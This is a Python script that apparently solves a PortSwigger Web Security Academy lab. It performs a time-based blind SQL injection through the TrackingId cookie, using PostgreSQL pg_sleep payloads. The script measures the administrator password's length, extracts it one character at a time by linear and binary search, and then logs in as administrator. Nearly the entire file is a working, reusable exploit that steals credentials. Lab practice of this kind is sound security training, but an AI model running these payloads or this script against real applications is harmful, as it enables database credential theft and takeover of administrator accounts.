import requests
import time


def solve_time_based_sqli():
    # Replace with urs 
    lab_url = "https://0ac10073045e2282802676760034009c.web-security-academy.net/"
    tracking_id = "mPYHwmwZnVmS1sNq"  

    print("Starting time-based blind SQL injection...")

    # Step 1: Confirm we can trigger delays
    if not test_time_delay(lab_url, tracking_id):
        print("Time-based injection not working")
        return

    # Step 2: Find password length
    password_length = find_password_length(lab_url, tracking_id)
    if not password_length:
        print("Failed to find password length")
        return

    print(f"Password length: {password_length}")

    # Step 3: Extract password character by character
    password = extract_password(lab_url, tracking_id, password_length)

    if password:
        print(f"Administrator password: {password}")
        login_as_administrator(lab_url, password)
    else:
        print("Failed to extract password")


def test_time_delay(lab_url, tracking_id):
    """Test if we can trigger time delays"""
    print("Testing time delay functionality...")

    # Test with true condition (should delay)
    payload_true = "' || (SELECT pg_sleep(10) FROM users WHERE username='administrator')--"
    start_time = time.time()
    response = send_request(lab_url, tracking_id, payload_true)
    elapsed_true = time.time() - start_time

    # Test with false condition (should not delay)
    payload_false = "' || (SELECT pg_sleep(10) FROM users WHERE username='nonexistent')--"
    start_time = time.time()
    response = send_request(lab_url, tracking_id, payload_false)
    elapsed_false = time.time() - start_time

    print(f"True condition delay: {elapsed_true:.2f}s")
    print(f"False condition delay: {elapsed_false:.2f}s")

    # If true condition causes significantly longer delay, injection works
    return elapsed_true > 8 and elapsed_false < 5


def find_password_length(lab_url, tracking_id, max_length=30):
    """Find password length using time delays"""
    print("Finding password length...")

    for length in range(1, max_length + 1):
        # PostgreSQL payload - trigger delay if password length = current length
        payload = f"' || (SELECT CASE WHEN LENGTH(password)={length} THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username='administrator')--"

        start_time = time.time()
        response = send_request(lab_url, tracking_id, payload)
        elapsed = time.time() - start_time

        if elapsed > 8:  # Significant delay indicates correct length
            return length

        # Progress indicator
        if length % 5 == 0:
            print(f"  Checked up to length {length}...")

    return None


def extract_password(lab_url, tracking_id, password_length):
    """Extract password character by character using time delays"""
    characters = "abcdefghijklmnopqrstuvwxyz0123456789"
    password = ""

    print(f"Extracting {password_length} character password...")

    for position in range(1, password_length + 1):
        found_char = None

        for char in characters:
            # PostgreSQL payload - trigger delay if character matches
            payload = f"' || (SELECT CASE WHEN SUBSTRING(password,{position},1)='{char}' THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username='administrator')--"

            start_time = time.time()
            response = send_request(lab_url, tracking_id, payload)
            elapsed = time.time() - start_time

            if elapsed > 8:  # Significant delay indicates correct character
                found_char = char
                password += char
                print(f"Position {position}: {char} | Password: {password}")
                break

        # If not found in lowercase, try uppercase
        if not found_char:
            for char in characters.upper():
                payload = f"' || (SELECT CASE WHEN SUBSTRING(password,{position},1)='{char}' THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username='administrator')--"

                start_time = time.time()
                response = send_request(lab_url, tracking_id, payload)
                elapsed = time.time() - start_time

                if elapsed > 8:
                    found_char = char
                    password += char
                    print(f"Position {position}: {char} | Password: {password}")
                    break

        if not found_char:
            password += "?"
            print(f"Position {position}: ? | Password: {password}")

        # Small delay to avoid overwhelming the server
        time.sleep(0.5)

    return password


def send_request(url, tracking_id, payload):
    """Send the SQL injection request"""
    cookies = {"TrackingId": tracking_id + payload}

    try:
        # Set a long timeout since we're testing delays
        response = requests.get(url, cookies=cookies, timeout=15)
        return response
    except requests.exceptions.Timeout:
        print("Request timed out (expected for long delays)")
        return None
    except Exception as e:
        print(f"Request failed: {e}")
        return None


def login_as_administrator(lab_url, password):
    """Login to the application as administrator"""
    print("Attempting to login as administrator...")

    session = requests.Session()

    # Get login page to extract CSRF token
    login_page = session.get(lab_url + "login")
    csrf_token = extract_csrf_token(login_page.text)

    if not csrf_token:
        print("Could not find CSRF token, trying without it...")
        csrf_token = ""

    # Login data
    login_data = {
        "username": "administrator",
        "password": password,
        "csrf": csrf_token
    }

    # Submit login
    login_response = session.post(lab_url + "login", data=login_data)

    if "Log out" in login_response.text or "admin" in login_response.text.lower():
        print("✅ SUCCESS: Logged in as administrator!")
        print("Lab solved!")
    else:
        print("❌ Failed to login. Password might be incorrect.")

#u dont need this in portswigger for now 
def extract_csrf_token(html):
    """Extract CSRF token from HTML"""
    import re
    patterns = [
        r'name="csrf" value="([^"]+)"',
        r'csrf["\']?\s*[:=]\s*["\']([^"\']+)',
        r'value="([^"]+)"[^>]*name="csrf"'
    ]

    for pattern in patterns:
        match = re.search(pattern, html)
        if match:
            return match.group(1)
    return None


# Alternative: Optimized version with binary search for faster extraction
def extract_password_fast(lab_url, tracking_id, password_length):
    """Faster extraction using binary search on characters"""
    import string

    # All possible characters in password
    all_chars = string.ascii_lowercase + string.digits
    password = ""

    print(f"Fast extraction of {password_length} character password...")

    for position in range(1, password_length + 1):
        low = 0
        high = len(all_chars) - 1

        while low <= high:
            mid = (low + high) // 2
            char = all_chars[mid]

            # Test if current character is correct
            payload = f"' || (SELECT CASE WHEN SUBSTRING(password,{position},1)='{char}' THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username='administrator')--"

            start_time = time.time()
            response = send_request(lab_url, tracking_id, payload)
            elapsed = time.time() - start_time

            if elapsed > 8:
                # Found the character
                password += char
                print(f"Position {position}: {char} | Password: {password}")
                break

            # Test if character should be in higher half
            payload_gt = f"' || (SELECT CASE WHEN SUBSTRING(password,{position},1)>'{char}' THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username='administrator')--"

            start_time = time.time()
            response = send_request(lab_url, tracking_id, payload_gt)
            elapsed_gt = time.time() - start_time

            if elapsed_gt > 8:
                low = mid + 1  # Character is greater than current
            else:
                high = mid - 1  # Character is less than or equal to current

        if low > high and len(password) < position:
            # Character not found with binary search, fallback to linear
            for char in all_chars:
                payload = f"' || (SELECT CASE WHEN SUBSTRING(password,{position},1)='{char}' THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username='administrator')--"

                start_time = time.time()
                response = send_request(lab_url, tracking_id, payload)
                elapsed = time.time() - start_time

                if elapsed > 8:
                    password += char
                    print(f"Position {position}: {char} | Password: {password}")
                    break

        if len(password) < position:
            password += "?"
            print(f"Position {position}: ? | Password: {password}")

        time.sleep(0.5)

    return password


if __name__ == "__main__":
    solve_time_based_sqli()
